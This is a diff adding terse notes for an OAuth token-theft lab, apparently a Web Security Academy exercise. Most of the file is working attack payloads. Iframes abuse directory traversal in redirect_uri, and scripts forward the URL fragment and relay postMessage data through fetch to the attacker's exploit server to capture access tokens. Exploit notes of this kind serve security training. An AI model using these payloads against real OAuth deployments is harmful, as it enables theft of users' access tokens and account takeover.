@@ -1,0 +1,36 @@
+analysis:
+    get /me to get api key
+
+try to attack like lab 4
+
+try to modify redirect_uri => fail
+try to add directory traversal => success => try to find open direct
+
+test fill in form => notice can attack through website input => open direct => locate to our exploit site
+
+payload:
+
+<script>
+    window.location = "/?" + document.location.hash;
+</script>
+
+<iframe src="https://oauth-0a0b00cd046c8064caaf6fb8026c00ba.oauth-server.net/auth?client_id=a8395i8hyge2vazyrokng&redirect_uri=https://0aef007c04c68083ca3c713400f00064.web-security-academy.net/oauth-callback/../post?postId=4&response_type=token&nonce=-1011049669&scope=openid%20profile%20email"></iframe>
+
+<iframe src="https://oauth-0a0b00cd046c8064caaf6fb8026c00ba.oauth-server.net/auth?client_id=a8395i8hyge2vazyrokng&redirect_uri=https://0aef007c04c68083ca3c713400f00064.web-security-academy.net/oauth-callback/../post?postId=4&response_type=token&nonce=-1011049669&scope=openid%20profile%20email">
+</iframe>
+
+<script>
+    window.addEventListener('message', function(e) {
+        fetch("/" + encodeURIComponent(e.data.data))
+    }, false)
+</script>
+
+
+<iframe src="https://oauth-0a0b00cd046c8064caaf6fb8026c00ba.oauth-server.net/auth?client_id=a8395i8hyge2vazyrokng&redirect_uri=https://0aef007c04c68083ca3c713400f00064.web-security-academy.net/oauth-callback/../post/comment/comment-form&response_type=token&nonce=-1011049669&scope=openid%20profile%20email">
+</iframe>
+
+<script>
+    window.addEventListener('message', function(e) {
+        fetch("/" + encodeURIComponent(e.data.data))
+    }, false)
+</script>
